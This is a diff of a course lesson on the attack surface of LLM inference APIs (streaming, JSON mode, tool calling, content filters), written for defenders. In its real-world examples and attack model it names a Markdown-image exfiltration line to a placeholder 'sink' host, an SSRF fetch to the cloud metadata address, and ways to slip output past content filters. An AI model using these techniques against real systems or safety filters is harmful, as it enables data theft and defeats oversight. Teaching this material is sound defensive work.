@@ -1,23 +1,3 @@
-<div class="prereq">
-
-**Prerequisites.** [02.1 Where the boundaries really are](lesson-01.md),
-[01.1 AppSec primitives](../module-01/lesson-01.md). Helpful: sibling
-[LLM Research Engineer](https://tal-giladi.github.io/llm-research-engineer-course/) M06.3
-(decoding: greedy/temperature/top-k/top-p) and M18 (tool schemas / function calling). We do not
-reteach *how* function calling or decoding work — we analyze their **security** properties.
-
-**You will learn.** The security surface of the *inference API* itself, the layer between your
-app and the model: streaming, structured output / JSON mode, function/tool calling, and content
-filters. For each, what it appears to guarantee, where the boundary really is, and how it is
-bypassed — so that in Stage 2+ you already know which mechanism an attack is abusing.
-
-**Why this matters.** Teams routinely assume "JSON mode means I get valid, safe JSON," "the tool
-schema constrains what the model can do," or "the provider's content filter catches bad output."
-Each assumption hides a boundary that is softer than it looks. Getting these right is most of
-building an LLM app that does not fall over on first contact with an attacker.
-
-</div>
-
 # 02.2 · The inference API attack surface
 
 ## Why this matters
@@ -100,15 +80,11 @@ of the right shape. What it does **not** guarantee:
   payloads that your downstream code then mishandles (classic injection, now with the model as
   source — 01.1).
 
-<div class="callout key">
-
-**JSON mode is a parser convenience, not a security control.** It removes "the model returned
-prose I couldn't parse" as a failure mode. It does nothing about *what the values mean or do*.
-Every field you act on must be validated and authorized in your code exactly as if it came from
-an untrusted user — because, transitively, it did.
-
-</div>
-
+> [!IMPORTANT]
+> **JSON mode is a parser convenience, not a security control.** It removes "the model returned
+> prose I couldn't parse" as a failure mode. It does nothing about *what the values mean or do*.
+> Every field you act on must be validated and authorized in your code exactly as if it came from
+> an untrusted user — because, transitively, it did.
 ### Function / tool calling
 
 Function calling is often misread as "the model can call functions." Precisely: **the model emits
@@ -141,13 +117,10 @@ Providers (and you) may run **input filters** (block/flag the prompt) and **outp
 - It adds **latency** and can itself be a target (prompt the model to phrase output to slip past
   a known filter).
 
-<div class="callout blue">
-
-**Filters are defense-in-depth, never the boundary.** A content filter lowers ASR; it does not
-make an action safe. If executing a tool call would be dangerous, the safety must come from *not
-having the capability / authorizing it in code*, not from hoping a classifier flags the request.
-
-</div>
+> [!TIP]
+> **Filters are defense-in-depth, never the boundary.** A content filter lowers ASR; it does not
+> make an action safe. If executing a tool call would be dangerous, the safety must come from *not
+> having the capability / authorizing it in code*, not from hoping a classifier flags the request.
 
 ## Intuition
 
@@ -158,7 +131,52 @@ latency and the responsibility for filter timing and partial-output side effects
 you a risk reduction and the responsibility for knowing their error rates. The recurring mistake
 is accepting the convenience while assuming the vendor kept the responsibility. They didn't.
 
-## Technical explanation & Code
+## Technical explanation
+
+## Mathematics
+
+The quantitative core here is filter evaluation, previewed now, derived in Module 24.
+
+A filter is a binary classifier. With true positives $TP$, false positives $FP$, false negatives
+$FN$:
+
+$$ \text{precision} = \frac{TP}{TP+FP}, \qquad \text{recall} = \frac{TP}{TP+FN}. $$
+
+Crucially, **precision depends on the base rate.** If genuine attacks are rare (prevalence $\pi$
+small) and the filter has true-positive rate (recall) $t$ and false-positive rate $f$, then by
+Bayes the probability a *flagged* item is truly an attack is
+
+$$ P(\text{attack} \mid \text{flagged}) = \frac{t\,\pi}{t\,\pi + f\,(1-\pi)}. $$
+
+For rare attacks ($\pi \to 0$) even a good filter ($t=0.95, f=0.02$) yields low precision — most
+alerts are false. This is why "our filter is 98% accurate" is nearly meaningless without the base
+rate, and why filters are triage, not gates. You will compute this for a real detector in M24.
+
+## Attack / Defense model
+
+> [!IMPORTANT]
+> **Guarantee analysis — provider/output content filter.**
+> - **Stops:** a fraction (its recall) of *recognized* harmful content; useful risk reduction.
+> - **Does NOT stop:** encoded/obfuscated/OOD content (false negatives), unsafe *actions* (it reads
+>   text, not capabilities), or anything whose harm is in a downstream side effect.
+> - **Attacker adapts:** obfuscation, splitting across streamed deltas, phrasing to evade the known
+>   classifier, or moving the harm into a tool call the filter never inspects.
+> - **False-positive cost:** blocked legitimate requests; with low attack base rates, most alerts
+>   are false (Bayes above), driving alert fatigue.
+> - **Performance cost:** added latency; a second model call for LLM-based filters.
+> - **Takeaway:** stack it *behind* real controls (least-privilege tools, authz in code, sandbox),
+>   never in front of them as the boundary.
+
+## Real-world examples
+
+- **JSON-mode value abuse** — apps that trust `{"authorized": true}` or act on a URL/path field
+  without validation; ordinary injection/SSRF/IDOR with the model as the untrusted source.
+- **Streamed-output rendering** — live-rendering model Markdown so an `![](http://sink/?d=...)`
+  fires an outbound request before any output filter completes (exfiltration channel; M18).
+- **Over-broad tool exposure** — shipping a `run_shell`/`fetch_url` tool "for flexibility" grants
+  a capability the schema does nothing to constrain; the root of many agent incidents (Stage 7).
+
+## Code
 
 A local, backend-agnostic loop that makes each boundary visible. It shows the *right* place to
 put validation and authorization relative to the model's output.
@@ -209,61 +227,11 @@ The single most important line of the lesson is that `authorized(...)` exists *a
 model, on the model's output, in your code.* Remove it and the schema alone will happily let a
 model-chosen `fetch_url("http://169.254.169.254/...")` or a cross-tenant `lookup_order` through.
 
-## Mathematics
-
-The quantitative core here is filter evaluation, previewed now, derived in Module 24.
-
-A filter is a binary classifier. With true positives $TP$, false positives $FP$, false negatives
-$FN$:
-
-$$ \text{precision} = \frac{TP}{TP+FP}, \qquad \text{recall} = \frac{TP}{TP+FN}. $$
-
-Crucially, **precision depends on the base rate.** If genuine attacks are rare (prevalence $\pi$
-small) and the filter has true-positive rate (recall) $t$ and false-positive rate $f$, then by
-Bayes the probability a *flagged* item is truly an attack is
-
-$$ P(\text{attack} \mid \text{flagged}) = \frac{t\,\pi}{t\,\pi + f\,(1-\pi)}. $$
-
-For rare attacks ($\pi \to 0$) even a good filter ($t=0.95, f=0.02$) yields low precision — most
-alerts are false. This is why "our filter is 98% accurate" is nearly meaningless without the base
-rate, and why filters are triage, not gates. You will compute this for a real detector in M24.
-
-## Attack / Defense model
-
-<div class="callout guarantee">
-
-**Guarantee analysis — provider/output content filter.**
-- **Stops:** a fraction (its recall) of *recognized* harmful content; useful risk reduction.
-- **Does NOT stop:** encoded/obfuscated/OOD content (false negatives), unsafe *actions* (it reads
-  text, not capabilities), or anything whose harm is in a downstream side effect.
-- **Attacker adapts:** obfuscation, splitting across streamed deltas, phrasing to evade the known
-  classifier, or moving the harm into a tool call the filter never inspects.
-- **False-positive cost:** blocked legitimate requests; with low attack base rates, most alerts
-  are false (Bayes above), driving alert fatigue.
-- **Performance cost:** added latency; a second model call for LLM-based filters.
-- **Takeaway:** stack it *behind* real controls (least-privilege tools, authz in code, sandbox),
-  never in front of them as the boundary.
-
-</div>
-
-## Real-world examples
-
-- **JSON-mode value abuse** — apps that trust `{"authorized": true}` or act on a URL/path field
-  without validation; ordinary injection/SSRF/IDOR with the model as the untrusted source.
-- **Streamed-output rendering** — live-rendering model Markdown so an `![](http://sink/?d=...)`
-  fires an outbound request before any output filter completes (exfiltration channel; M18).
-- **Over-broad tool exposure** — shipping a `run_shell`/`fetch_url` tool "for flexibility" grants
-  a capability the schema does nothing to constrain; the root of many agent incidents (Stage 7).
-
 ## Practical lab
-
-<div class="lab">
 
 **Lab 02.2 — Put the boundary in the right place.** CPU-only; localhost only; uses `api_surface.py`
 plus a stubbed model that emits chosen tool calls (so you control the "attacker-influenced"
 output deterministically — no real model needed). Expected time: 60–90 min.
-
-</div>
 
 ## Exercise
 
@@ -303,10 +271,6 @@ exactly the streaming trade-off named in the lesson.
 (post-fix), the path-validation bypass+fix, the streaming-leak demo+fix, and your two Bayes
 computations with one-line interpretations.
 
-```bash
-py course.py complete 02.2
-```
-
 ## Research paper
 
 No single paper — this is engineering foundation. Read instead: your primary model provider's
@@ -323,44 +287,6 @@ is the boundary this lesson is about. (Distinguish DOCUMENTED guarantee vs recom
 - OWASP LLM Top 10: **LLM05 Improper Output Handling** and **LLM06 Excessive Agency** — the
   standardized names for the two failure modes in this lesson; mapped in `references/standards-map.md`.
 
-## Assessment
-
-<details><summary>Q1. What does JSON mode guarantee and what does it not?</summary>
-
-It guarantees (largely) syntactic conformance — parseable JSON of the specified shape/types. It
-does not guarantee value safety (a valid string can be an SSRF/canary payload), semantic truth (a
-`"authorized": true` field is just generated text), or injection-freedom. Every acted-on value
-must be validated and authorized in your code as untrusted input.
-
-</details>
-
-<details><summary>Q2. Function calling: what does the tool schema constrain, and what is your job?</summary>
-
-The schema constrains the *shape* of the arguments (types, required fields, enums). Your code must
-decide whether to execute at all, validate argument *values* (paths, URLs, amounts), and enforce
-*authorization* (is this principal allowed this action on this resource). Exposing a tool grants a
-capability reachable by model-influenced text; only your code turns that into a safe action.
-
-</details>
-
-<details><summary>Q3. Why can't a content filter be the security boundary?</summary>
-
-It is a probabilistic classifier with finite recall (bypassable by obfuscation/OOD content) and,
-at low attack base rates, low precision (most alerts false, by Bayes). It reads text, not
-capabilities, so it cannot make an unsafe *action* safe. It reduces risk (defense-in-depth) but
-must sit behind real controls (least privilege, authz in code, sandboxing).
-
-</details>
-
-<details><summary>Q4. Name one security pitfall unique to streaming and its fix.</summary>
-
-Acting on partial output before an output filter (which decides on the complete message)
-finishes — e.g. live-rendering a URL that fires an outbound request, leaking a canary before the
-block would apply. Fix: gate the side effect on the filter's decision (buffer until decided),
-accepting added latency; or run the side-effect-producing step only on validated, complete output.
-
-</details>
-
 ## What you should now be able to do
 
 - Draw the inference-API trust boundaries and place validation/authorization on the correct side.
@@ -368,13 +294,20 @@ accepting added latency; or run the side-effect-producing step only on validated
 - Build a tool-calling loop where the schema checks shape and *your code* checks values and authz.
 - Evaluate a filter with precision/recall and the base-rate (Bayes) correction.
 
-## Progress checkpoint
+-->
+**Prerequisites.** [02.1 Where the boundaries really are](lesson-01.md),
+[01.1 AppSec primitives](../module-01/lesson-01.md). Helpful: sibling
+[LLM Research Engineer](https://tal-giladi.github.io/llm-research-engineer-course/) M06.3
+(decoding: greedy/temperature/top-k/top-p) and M18 (tool schemas / function calling). We do not
+reteach *how* function calling or decoding work — we analyze their **security** properties.
 
-```bash
-py course.py complete 02.2
-py course.py next
-```
+**You will learn.** The security surface of the *inference API* itself, the layer between your
+app and the model: streaming, structured output / JSON mode, function/tool calling, and content
+filters. For each, what it appears to guarantee, where the boundary really is, and how it is
+bypassed — so that in Stage 2+ you already know which mechanism an attack is abusing.
 
-**Next:** Stage 2 opens with **direct prompt injection & the instruction hierarchy** (Module 04),
-where these mechanisms — the message hierarchy (02.1) and the API surface (02.2) — are attacked
-in the first Docker lab with a toy vulnerable app and synthetic canaries.
+**Why this matters.** Teams routinely assume "JSON mode means I get valid, safe JSON," "the tool
+schema constrains what the model can do," or "the provider's content filter catches bad output."
+Each assumption hides a boundary that is softer than it looks. Getting these right is most of
+building an LLM app that does not fall over on first contact with an attacker.
+-->
